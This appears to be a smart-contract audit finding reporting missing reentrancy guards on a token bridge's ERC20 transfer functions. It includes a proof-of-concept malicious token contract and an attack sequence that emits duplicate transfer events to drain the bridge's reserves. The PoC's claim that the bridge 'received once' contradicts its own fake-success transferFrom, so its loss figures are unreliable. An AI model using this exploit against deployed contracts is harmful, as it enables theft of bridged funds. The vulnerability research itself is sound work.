### Title
Missing Reentrancy Guard on ERC20 Bridge Request Functions Allows Double-Spend via Registered Token Callback — (`contracts/service_chain/bridge/BridgeTransferERC20.sol`)

### Summary

`BridgeTransferERC20.requestERC20Transfer` and `BridgeTransferERC20.onERC20Received` make external calls to registered ERC20 token contracts without reentrancy protection. A registered token with a transfer callback (e.g., ERC777-style hooks) can reenter these functions during `_payERC20FeeAndRefundChange`, emitting multiple `RequestValueTransfer` events with distinct nonces for a single deposit. The counterpart bridge operator processes every event and releases tokens on the other chain for each one, draining the bridge's reserves.

### Finding Description

`BridgeTransferKLAY` explicitly inherits `ReentrancyGuard` and marks `_requestKLAYTransfer` as `nonReentrant`. The comment in `BridgeFee._payKLAYFeeAndRefundChange` even documents this requirement:

```
// Caller of this function must be nonReentrant.
// - BridgeTransferKLAY._requestKLAYTransfer() is nonReentrant
``` [1](#0-0) 

No equivalent protection exists for the ERC20 path. `BridgeTransferERC20` does not inherit `ReentrancyGuard`, and neither `requestERC20Transfer` nor `onERC20Received` carries `nonReentrant`: [2](#0-1) [3](#0-2) 

Both functions call `_requestERC20Transfer`, which calls `_payERC20FeeAndRefundChange`: [4](#0-3) 

`_payERC20FeeAndRefundChange` makes two external calls to the token contract — `safeTransfer(feeReceiver, fee)` and `safeTransfer(from, feeRefund)` — before `requestNonce` is incremented: [5](#0-4) 

Because `requestNonce++` occurs after these external calls, any reentrant invocation of `requestERC20Transfer` observes the pre-increment nonce value, emits `RequestValueTransfer` with that nonce, and then increments it. The outer call then emits a second event with the next nonce. Both events are structurally valid and will be processed by the bridge operator. [6](#0-5) 

`handleERC20Transfer` has the same omission — it is `public onlyOperators` with no `nonReentrant`, and its external call to `safeTransfer` or `mint` occurs after state is already committed: [7](#0-6) 

The `Bridge` contract inherits `ReentrancyGuard` through `BridgeTransferKLAY`, so the modifier is available in scope but is simply never applied to the ERC20 entry points: [8](#0-7) [9](#0-8) 

### Impact Explanation

A registered ERC20 token with a transfer hook (ERC777 `tokensToSend`/`tokensReceived`, or any custom callback in `transfer`/`transferFrom`) can reenter `requestERC20Transfer` during `_payERC20FeeAndRefundChange`. Each reentrant frame emits a `RequestValueTransfer` event with a unique, monotonically increasing nonce. The bridge operator on the counterpart chain (`node/sc/bridge_manager.go`) calls `HandleERC20Transfer` for every observed event: [10](#0-9) 

Each `HandleERC20Transfer` call releases `_value` tokens to the recipient. The bridge therefore sends N×`_value` tokens while only receiving `_value` tokens, draining its ERC20 reserves. The corrupted value is the bridge's token balance on the counterpart chain.

### Likelihood Explanation

Token registration requires `onlyOwner`, which limits the attack surface to tokens the bridge owner has approved. However:

- ERC777 tokens are widely deployed and their hooks are a standard feature, not a sign of malice. An owner registering a legitimate ERC777 token unknowingly enables this path.
- The asymmetry is stark: KLAY functions are explicitly guarded; ERC20 functions are not, and the codebase comment acknowledges the requirement only for KLAY. [11](#0-10) 

### Recommendation

1. Add `nonReentrant` to `requestERC20Transfer`, `onERC20Received`, and `handleERC20Transfer` in `BridgeTransferERC20`, and to `handleERC721Transfer` and `requestERC721Transfer` in `BridgeTransferERC721`. The `ReentrancyGuard` is already inherited by `Bridge` through `BridgeTransferKLAY`.
2. Update the comment in `BridgeFee._payERC20FeeAndRefundChange` to document the same nonReentrant requirement that exists for `_payKLAYFeeAndRefundChange`.

### Proof of Concept

```solidity
// MaliciousERC20 — registered by bridge owner as a legitimate token
contract MaliciousERC20 is IERC20 {
    Bridge public bridge;
    address public attacker;
    bool private _reentering;

    function transferFrom(address, address, uint256) external returns (bool) {
        if (!_reentering) {
            _reentering = true;
            // Reenter requestERC20Transfer with the same parameters.
            // requestNonce has not yet been incremented, so a new unique nonce
            // will be assigned to this inner RequestValueTransfer event.
            bridge.requestERC20Transfer(
                address(this), attacker, 1e18, 0, ""
            );
            _reentering = false;
        }
        return true; // fake success — no tokens actually moved
    }

    function transfer(address, uint256) external returns (bool) { return true; }
    // ... other IERC20 stubs
}

// Attack sequence:
// 1. Owner registers MaliciousERC20 on the bridge.
// 2. Attacker calls bridge.requestERC20Transfer(MaliciousERC20, attacker, 1e18, 0, "").
// 3. safeTransferFrom triggers MaliciousERC20.transferFrom, which reenters
//    requestERC20Transfer → emits RequestValueTransfer(nonce=0).
//    requestNonce becomes 1.
// 4. Outer call resumes → emits RequestValueTransfer(nonce=1).
//    requestNonce becomes 2.
// 5. Bridge operator sees two valid events (nonce 0 and nonce 1) and calls
//    handleERC20Transfer twice on the counterpart bridge.
// 6. Counterpart bridge releases 2×1e18 tokens to attacker.
// 7. Net loss to bridge: 1e18 tokens (received once, paid out twice).

    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
